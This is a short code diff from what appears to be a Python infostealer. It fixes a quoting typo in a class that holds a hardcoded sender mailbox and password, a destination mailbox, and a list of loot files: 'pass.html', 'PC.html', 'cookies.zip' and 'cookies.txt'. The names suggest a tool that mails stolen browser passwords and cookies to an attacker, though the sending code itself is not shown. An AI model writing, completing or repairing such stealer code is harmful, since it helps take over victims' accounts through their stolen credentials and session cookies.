@@ -14,7 +14,7 @@ class Main:
     def __init__(self):
         self.source_mail = 'aymous124@myyahoo.com'
         self.source_pass = 'stealpassword_134A'
-        self.dest_mail =  'aymous124@myyahoo.com]
+        self.dest_mail =  'aymous124@myyahoo.com'
 
         self.files = ['pass.html', 'PC.html', 'cookies.zip', 'cookies.txt']
 
